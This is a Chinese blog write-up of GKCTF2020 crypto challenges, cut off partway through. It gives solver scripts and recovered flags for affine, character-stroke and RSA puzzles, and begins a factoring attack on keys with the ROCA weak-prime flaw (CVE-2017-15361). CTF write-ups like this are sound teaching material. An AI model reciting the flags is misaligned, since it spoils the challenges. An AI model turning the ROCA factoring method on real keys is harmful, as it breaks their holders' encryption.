<!-- build time:Fri Sep 08 2023 19:35:37 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="GKCTF2020"><link rel="canonical" href="https://blog.xcu.icu/2023/04/05/GKCTF2020/"><title>GKCTF2020WP - WP | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">GKCTF2020WP</h1><div class="meta"><span class="item" title="创建时间：2023-04-05 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-04-05T00:00:00+08:00">2023-04-05</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>19k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>17 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/75.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/133.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/4.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/130.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/36.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/105.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WP/" itemprop="item" rel="index" title="分类于 WP"><span itemprop="name">WP</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2023/04/05/GKCTF2020/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>通过 buuctf 平台复现一些之前的赛题</p><h2 id="crypto"><a class="anchor" href="#crypto">#</a> Crypto</h2><h3 id="小学生的密码题"><a class="anchor" href="#小学生的密码题">#</a> 小学生的密码题</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png" alt="image-20230403104605972"></p><p>题目描述就这么多，简单的仿射加密</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>c<span class="token operator">=</span>Ea<span class="token punctuation">,</span>b<span class="token punctuation">(</span><span class="token regex">m)=am+b (mod 26)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token regex">m=Da,b(c)=a</span>−<span class="token number">1</span><span class="token punctuation">(</span>c−b<span class="token punctuation">)</span> <span class="token punctuation">(</span>mod <span class="token number">26</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>根据题目描述，可得 a=11，b=6</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>m <span class="token operator">=</span> <span class="token string">'welcylk'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>a<span class="token operator">=</span><span class="token number">11</span></pre></td></tr><tr><td data-num="6"></td><td><pre>b<span class="token operator">=</span><span class="token number">6</span></pre></td></tr><tr><td data-num="7"></td><td><pre>c<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="8"></td><td><pre>k<span class="token operator">=</span><span class="token number">26</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    c <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">//</span>sorcery</pre></td></tr></table></figure><h3 id="汉字的秘密"><a class="anchor" href="#汉字的秘密">#</a> 汉字的秘密</h3><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫</pre></td></tr></table></figure><p>当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>hz <span class="token operator">=</span> <span class="token string">"田口由中人工大土士王夫井羊壮"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sz <span class="token operator">=</span> <span class="token string">"00123455567899"</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>m <span class="token operator">=</span> <span class="token string">"王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>s <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span> i <span class="token keyword">in</span> hz<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        s <span class="token operator">+=</span> sz<span class="token punctuation">[</span>hz<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        s <span class="token operator">+=</span> <span class="token string">' '</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># print(s)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>ll <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>s <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">#EJ>CvSHMV7G9R9@?3k</span></pre></td></tr></table></figure><p>这里转化后，发现转为字符后不规律，这里即将前几个字符对应 flag 转换，是一个变异凯撒</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>hz <span class="token operator">=</span> <span class="token string">"田口由中人工大土士王夫井羊壮"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sz <span class="token operator">=</span> <span class="token string">"00123455567899"</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>m <span class="token operator">=</span> <span class="token string">"王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>s <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span> i <span class="token keyword">in</span> hz<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        s <span class="token operator">+=</span> sz<span class="token punctuation">[</span>hz<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        s <span class="token operator">+=</span> <span class="token string">' '</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># print(s)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>ll <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>s <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">#flag&#123;you_are_good&#125;</span></pre></td></tr></table></figure><h3 id="babycrypto"><a class="anchor" href="#babycrypto">#</a> babycrypto</h3><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># e:65537</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># p>>128&lt;&lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L</span></pre></td></tr></table></figure><p>拿到题后就是上面的内容，看起来是 RSA，20 年的题了现在可以直接分解出来这个 n，直接常规接 RSA 即可</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> libnum</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> <span class="token number">22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453</span></pre></td></tr><tr><td data-num="5"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p <span class="token operator">=</span> <span class="token number">139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> <span class="token number">160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c <span class="token operator">=</span> <span class="token number">1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>N <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">//</span><span class="token string">b'flag&#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&#125;'</span></pre></td></tr></table></figure><h3 id="backdoor"><a class="anchor" href="#backdoor">#</a> Backdoor</h3><p>这个题下载后给了三个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png" alt="image-20230404152640752"></p><p>题目名叫后门，给了一个公式<strong>弱素数生成公式</strong></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png" alt="image-20230404152753424"></p><p>flag.enc</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg<span class="token operator">==</span></pre></td></tr></table></figure><p>这个值解 base64 之后转 10 进制</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768</span></pre></td></tr></table></figure><p>pub.pem</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>BEGIN PUBLIC KEY<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX<span class="token operator">/</span>zmNv</pre></td></tr><tr><td data-num="3"></td><td><pre>8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ<span class="token operator">==</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>END PUBLIC KEY<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span> binascii</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> FLAG <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">rsa_encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./pub.pem'</span> <span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    e <span class="token operator">=</span> key<span class="token punctuation">.</span>e</pre></td></tr><tr><td data-num="12"></td><td><pre>    n <span class="token operator">=</span> key<span class="token punctuation">.</span>n</pre></td></tr><tr><td data-num="13"></td><td><pre>    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre> </pre></td></tr><tr><td data-num="15"></td><td><pre>    ciphertext <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> ciphertext</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>rsa_encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>google 后发现是 CVE-2017-15361，<span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=">那么爱沙尼亚身份证系统和 TPM 的问题是什么？弱素数生成器（和 RSA！ | 作者：比尔・布坎南教授 OBE |A 安全网站：当鲍勃遇见爱丽丝 | 中等 (medium.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==">弱素数生成器 （RSALib） (asecuritysite.com)</span></p><p>其中 <em>k</em> 和 <em>a</em> 是破解时的未知整数。<em>M</em> 是前 n 个素数的乘法。</p><p>n 的素数因子 p 是由这个公式得出的</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>k<span class="token operator">=</span><span class="token number">3</span></pre></td></tr><tr><td data-num="4"></td><td><pre>vals<span class="token operator">=</span><span class="token number">39</span></pre></td></tr><tr><td data-num="5"></td><td><pre>a<span class="token operator">=</span><span class="token number">12</span></pre></td></tr><tr><td data-num="6"></td><td><pre>M<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span 